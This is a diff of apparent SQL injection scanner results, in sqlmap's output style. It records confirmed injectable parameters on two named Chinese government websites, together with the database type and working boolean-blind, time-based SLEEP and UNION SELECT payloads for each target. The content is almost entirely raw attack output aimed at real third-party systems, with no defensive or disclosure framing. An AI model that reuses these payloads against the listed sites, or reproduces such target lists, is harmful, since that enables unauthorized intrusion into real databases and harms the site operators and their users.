@@ -1,4 +1,30 @@
 
+[+]url: http://duihua.zs.gov.cn:88/view/
+[+]query: ID=151
+[+]data: None
+[+]dbms: MySQL
+[+]suffix:  AND '[RANDSTR]'='[RANDSTR]
+[+]dbms_version: [u'>= 5.0.12']
+[+]prefix: '
+[+]place: GET
+[+]os: None
+[+]parameter ID
+---------------INJECTION    TYPE    1-----------------------
+[+]title: AND boolean-based blind - WHERE or HAVING clause
+[+]payload: ID=151' AND 5280=5280 AND 'yUym'='yUym
+[+]error: []
+
+---------------INJECTION    TYPE    5-----------------------
+[+]title: MySQL >= 5.0.12 AND time-based blind
+[+]payload: ID=151' AND SLEEP([SLEEPTIME]) AND 'qVlS'='qVlS
+[+]error: []
+
+---------------INJECTION    TYPE    6-----------------------
+[+]title: Generic UNION query (NULL) - 1 to 20 columns
+[+]payload: ID=-6924' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71717a6a71,0x6b5643747a684a51724d695468686e554368457a6c61646c554c6f77744a4543445575454c667376,0x716a767171),NULL,NULL-- zqbW
+[+]error: []
+
+
 [+]url: http://swwsj.gdwst.gov.cn:80/kszn.php
 [+]query: id=20
 [+]data: None
@@ -11,43 +37,17 @@
 [+]parameter id
 ---------------INJECTION    TYPE    1-----------------------
 [+]title: AND boolean-based blind - WHERE or HAVING clause
-[+]payload: id=20' AND 6269=6269 AND 'Tpqf'='Tpqf
+[+]payload: id=20' AND 2343=2343 AND 'cpOx'='cpOx
 [+]error: []
 
 ---------------INJECTION    TYPE    5-----------------------
 [+]title: MySQL >= 5.0.12 AND time-based blind
-[+]payload: id=20' AND SLEEP([SLEEPTIME]) AND 'CVuw'='CVuw
+[+]payload: id=20' AND SLEEP([SLEEPTIME]) AND 'kDUx'='kDUx
 [+]error: []
 
 ---------------INJECTION    TYPE    6-----------------------
 [+]title: Generic UNION query (NULL) - 1 to 20 columns
-[+]payload: id=20' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627871,0x47757047544b534671417a4f706477786a42614866735046504254507a5755784f4e6d6f4e536367,0x716a6a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Psvp
-[+]error: []
-
-
-[+]url: http://swwsj.gdwst.gov.cn:80/kszn.php
-[+]query: id=20
-[+]data: None
-[+]dbms: MySQL
-[+]suffix:  AND '[RANDSTR]'='[RANDSTR]
-[+]dbms_version: [u'>= 5.0.12']
-[+]prefix: '
-[+]place: GET
-[+]os: None
-[+]parameter id
----------------INJECTION    TYPE    1-----------------------
-[+]title: AND boolean-based blind - WHERE or HAVING clause
-[+]payload: id=20' AND 6269=6269 AND 'Tpqf'='Tpqf
-[+]error: []
-
----------------INJECTION    TYPE    5-----------------------
-[+]title: MySQL >= 5.0.12 AND time-based blind
-[+]payload: id=20' AND SLEEP([SLEEPTIME]) AND 'CVuw'='CVuw
-[+]error: []
-
----------------INJECTION    TYPE    6-----------------------
-[+]title: Generic UNION query (NULL) - 1 to 20 columns
-[+]payload: id=20' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627871,0x47757047544b534671417a4f706477786a42614866735046504254507a5755784f4e6d6f4e536367,0x716a6a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Psvp
+[+]payload: id=20' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7178707a71,0x74474c656f536c4e70594a796c444258734c6b73446f46494a714e465377586f6b68435a4e474f79,0x7170767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Dibr
 [+]error: []
 
 
@@ -63,16 +63,16 @@
 [+]parameter ID
 ---------------INJECTION    TYPE    1-----------------------
 [+]title: AND boolean-based blind - WHERE or HAVING clause
-[+]payload: ID=151' AND 9895=9895 AND 'IjZV'='IjZV
+[+]payload: ID=151' AND 5280=5280 AND 'yUym'='yUym
 [+]error: []
 
 ---------------INJECTION    TYPE    5-----------------------
 [+]title: MySQL >= 5.0.12 AND time-based blind
-[+]payload: ID=151' AND SLEEP([SLEEPTIME]) AND 'Mntg'='Mntg
+[+]payload: ID=151' AND SLEEP([SLEEPTIME]) AND 'qVlS'='qVlS
 [+]error: []
 
 ---------------INJECTION    TYPE    6-----------------------
 [+]title: Generic UNION query (NULL) - 1 to 20 columns
-[+]payload: ID=-8150' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b717871,0x6d47457a4a69784957516b7444566a747953746b76736b457050736244764d766d74517967484953,0x7171627171),NULL,NULL,NULL,NULL-- rTQm
+[+]payload: ID=-6924' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71717a6a71,0x6b5643747a684a51724d695468686e554368457a6c61646c554c6f77744a4543445575454c667376,0x716a767171),NULL,NULL-- zqbW
 [+]error: []
 
